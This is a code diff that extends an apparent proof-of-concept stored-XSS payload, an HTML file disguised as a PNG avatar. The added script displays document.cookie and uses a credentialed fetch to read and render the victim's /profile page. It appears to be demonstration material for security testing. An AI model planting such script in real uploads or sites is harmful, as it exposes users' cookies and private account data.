@@ -21,8 +21,21 @@ HTML = """\
 <head><title>avatar-payload.png</title></head>
 <body>
 <h1>Upload time said <code>image/png</code>. Serve time says <code>text/html</code>.</h1>
-<p>document =&gt; <script>document.write(document.domain + location.pathname)</script></p>
-<script>alert("Stored XSS on " + document.domain);</script>
+<p>Origin: <script>document.write(document.domain + location.pathname)</script></p>
+<script>
+  alert("Stored XSS on origin: " + document.domain
+        + "\\nCookies visible to this page: " + document.cookie);
+
+  fetch("/profile", {credentials: "include"})
+    .then(function (r) { return r.text(); })
+    .then(function (t) {
+      var box = document.createElement("div");
+      box.innerHTML =
+        "<h2>Same-origin read of /profile through this XSS:</h2>" +
+        "<pre>" + t.replace(/</g, "&lt;").slice(0, 3000) + "</pre>";
+      document.body.appendChild(box);
+    });
+</script>
 </body>
 </html>
 """
